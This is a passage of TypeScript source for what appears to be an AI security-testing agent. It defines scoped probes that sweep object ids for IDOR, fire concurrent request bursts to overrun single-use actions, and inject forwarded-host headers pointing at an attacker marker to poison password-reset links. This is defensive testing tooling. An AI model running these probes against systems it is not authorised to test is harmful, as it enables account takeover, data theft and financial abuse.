                    positiveReplays: [r.p1.evId, ...(r.p2 ? [r.p2.evId] : [])],
                    ...(r.impact.length ? { impact: r.impact.map((i) => ({ kind: i.kind, marker: i.marker })) } : {}),
                    verdict: `IDOR/BOLA CONFIRMED by sweep — the '${f.name}' ${f.loc.via} field is object-scoped: id ${vid} returned another user's object (status ${r.p1.status}, cross-user data present) while a non-existent id was denied (control ${ctrl.status}). record_finding(category ${cat}) with these evidenceIds.`,
                  }),
                );
              if (r.publicDirectory) directory = true;
              else if (r.p1.status < 400 && Math.abs(r.p1.len - ctrl.len) > 64) populated.push({ id: vid, evId: r.p1.evId, status: r.p1.status });
            }
            swept.push({ param: f.name, via: f.loc.via, control: ctrl.evId, tried: candidates, populated, ...(directory ? { directory: true } : {}) });
          }
          const anyPopulated = swept.filter((x) => x.populated.length > 0);
          const lead = anyPopulated[0];
          const directoryOnly = !lead && swept.some((x) => x.directory);
          return txt(
            JSON.stringify({
              mode: "sweep",
              sweptFields: swept.map((x) => `${x.param}(${x.via})`),
              observed: swept,
              verdict: lead
                ? `not auto-confirmed, but ${anyPopulated.length} id field(s) (${anyPopulated.map((x) => x.param).join(", ")}) returned a POPULATED object for a neighbour id while a non-existent id was denied — a real cross-user anomaly whose ownership couldn't be auto-proven. If plausibly another user's PRIVATE object (not just a public display-name card), record verdict:"suspected" with negativeControl:"${lead.control}" + observation:"${lead.populated[0]!.evId}" (that control-vs-observation pair IS the observed differential the suspected gate requires); or log in as a second role for a real victim id and re-run.`
                : directoryOnly
                  ? `not IDOR: swept id fields returned a PUBLIC DIRECTORY (people-picker or store/location locator). Typically intended — mark idor tested-clean.`
                  : `CLEAN (id-scoping holds): swept ${swept.length} id-bearing field(s) [${swept.map((x) => `${x.param}(${x.via})`).join(", ")}] with neighbour + known-object ids; none returned another user's object and non-existent controls were denied. Mark idor tested-clean for this screen.`,
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),

    // ───────────────────────── race condition (concurrency / TOCTOU) ─────────────────────────
    tool(
      "probe_race",
      "Confirm a RACE CONDITION (TOCTOU / limit-overrun): fires N identical requests CONCURRENTLY and checks whether a single-use / limited action succeeds MORE THAN ONCE (a one-time coupon redeemed twice, a balance withdrawn/transferred twice, an OTP or invite accepted twice, a stock/quota overrun). Pass the request (url + method + body) and `successMarker` — a string that appears ONLY on success (e.g. \"redeemed\", a new balance, a confirmation id). It sends `count` (default 10, max 20) requests in parallel; if >=2 succeed when only 1 should, the limit was overrun by concurrency. Point it at a FRESH single-use resource (a just-created coupon/token) — the burst consumes it. Returns negativeControl (a rejected/sequential attempt proving the limit normally holds) + positiveReplays (2 concurrent successes) → record_finding(category race-condition).",
      { url: z.string(), successMarker: z.string(), method: z.string().optional(), body: z.string().optional(), count: z.number().optional() },
      async ({ url, successMarker, method, body, count }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        const n = Math.min(Math.max(Math.floor(count ?? 10), 2), 20);
        const req: HttpRequest = { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url, headers: authHeaders(s), body: body ?? null };
        const isSuccess = (r: HttpResponse | null): r is HttpResponse => !!r && r.status < 400 && r.body.includes(successMarker);
        const rec = (res: HttpResponse, kind: "negative_control" | "positive_replay", tag: string): string =>
          s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-race", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `race ${tag}` }).id;
        try {
          // ── concurrent burst: Promise.all fires a real parallel volley (the rate limiter's per-send delay is uniform,
          //    so the batch resolves its waits together and hits ~simultaneously — the concurrency a TOCTOU needs). ──
          const results = await Promise.all(
            Array.from({ length: n }, () =>
              s.http
                .send({ ...req })
                .then((res) => {
                  bumpHttp(s, res.status);
                  return res;
                })
                .catch(() => null),
            ),
          );
          const ok = results.filter(isSuccess);
          if (ok.length < 2)
            return txt(JSON.stringify({ concurrentSuccesses: ok.length, of: n, verdict: `not confirmed: at most ${ok.length}/${n} concurrent requests succeeded — the limit looks concurrency-safe (or the marker/target was wrong; point at a FRESH single-use resource and pass the exact success marker).` }));
          // control = a rejected concurrent attempt (the limit DID fire for it). If ALL succeeded, a sequential follow-up
          // should now be denied (resource consumed) — if it also succeeds, the action simply isn't single-use.
          const deniedRes = results.find((r): r is HttpResponse => !!r && !isSuccess(r));
          let ctrlEv: string;
          if (deniedRes) {
            ctrlEv = rec(deniedRes, "negative_control", "a rejected concurrent attempt (limit held for this one)");
          } else {
            const seq = await s.http.send({ ...req });
            bumpHttp(s, seq.status);
            if (isSuccess(seq))
              return txt(JSON.stringify({ concurrentSuccesses: ok.length, of: n, verdict: `not a RACE: ${ok.length}/${n} concurrent succeeded AND a sequential follow-up ALSO succeeds — the action is simply repeatable (no single-use limit to overrun). If it is SUPPOSED to be single-use, that is a separate logic bug.` }));
            ctrlEv = rec(seq, "negative_control", "sequential follow-up denied (resource consumed) — the limit exists");
          }
          const p1 = rec(ok[0]!, "positive_replay", "concurrent success #1");
          const p2 = rec(ok[1]!, "positive_replay", "concurrent success #2");
          return txt(
            JSON.stringify({
              negativeControl: ctrlEv,
              positiveReplays: [p1, p2],
              effectMarker: successMarker,
              concurrentSuccesses: ok.length,
              of: n,
              verdict: `RACE CONDITION CONFIRMED — ${ok.length}/${n} concurrent requests succeeded on a single-use/limited action while a rejected/sequential control shows the limit normally holds. TOCTOU / limit-overrun. record_finding(category race-condition) with these evidenceIds + effectMarker.`,
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),
    // ───────────────────────── reset host-header poisoning (account-takeover) ─────────────────────────
    tool(
      "probe_reset_poison",
      'Confirm password-reset HOST-HEADER POISONING (an account-takeover primitive) IN-BAND: re-send the reset request with X-Forwarded-Host / X-Forwarded-Server / Forwarded set to an attacker host and check whether that host is REFLECTED into a URL in the RESPONSE (a reset link built from the forwarded host), while a clean control (no header) does NOT reflect it. Confirms only the in-band case; if the reset link is delivered ONLY by email (not echoed in the response), this cannot confirm — record verdict:"suspected" (account-takeover) and verify with a mailbox. Pass the reset endpoint url + the request body (with the victim email).',
      { url: z.string(), method: z.string().optional(), body: z.string().optional() },
      async ({ url, method, body }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        const host = OOB_MARKER;
        const poison: Record<string, string> = { "x-forwarded-host": host, "x-forwarded-server": host, forwarded: `host=${host}`, "x-host": host };
        const send = async (extra: Record<string, string>, kind: "negative_control" | "positive_replay", tag: string) => {
          const req: HttpRequest = { method: (method ?? "POST").toUpperCase(), url, headers: { ...authHeaders(s), ...extra }, body: body ?? null };
          const res = await s.http.send(req);
          bumpHttp(s, res.status);
          const reflected = res.body.includes(host) || (res.headers["location"] ?? "").includes(host); // attacker host echoed in a URL/Location
          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-reset-poison", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `reset-poison ${tag}` });
          return { evId: ev.id, status: res.status, reflected };
        };
        try {
          const ctrl = await send({}, "negative_control", "clean (no forwarded host)");
          const p1 = await send(poison, "positive_replay", "poisoned #1");
          const p2 = await send(poison, "positive_replay", "poisoned #2");
          const confirmed = !ctrl.reflected && p1.reflected && p2.reflected;
          return txt(
            JSON.stringify({
              negativeControl: ctrl.evId,
              positiveReplays: [p1.evId, p2.evId],
              effectMarker: host,
              reflected: { control: ctrl.reflected, poisoned1: p1.reflected, poisoned2: p2.reflected },
              verdict: confirmed
                ? `RESET HOST-HEADER POISONING CONFIRMED (in-band) — the attacker host ${host} is reflected in the reset response (a reset link built from X-Forwarded-Host), absent in the clean control. record_finding(category account-takeover, high) with these evidenceIds + effectMarker.`
                : ctrl.reflected
                  ? `inconclusive: the host marker appears even in the CLEAN control — the app echoes the header unconditionally, which is not proof the reset LINK is poisoned.`
                  : `not confirmed IN-BAND: the poisoned host is not reflected in the response. The reset link may still be poisoned in the DELIVERED EMAIL — if no mailbox is reachable, record verdict:"suspected" (account-takeover) citing the injectable header.`,
            }),
          );
        } catch (e) {
          return txt(`ERROR: ${String(e).slice(0, 180)}`);
        }
      },
    ),

    tool(
      "done",
      "Finish the whole assessment early with a concise summary (normally the orchestrator ends each stage; use only to abort).",
      { summary: z.string() },
      async ({ summary }) => {
        s.done = true;
        s.doneSummary = summary;
        return txt("assessment complete — summary recorded");
      },
    ),
  ];
}
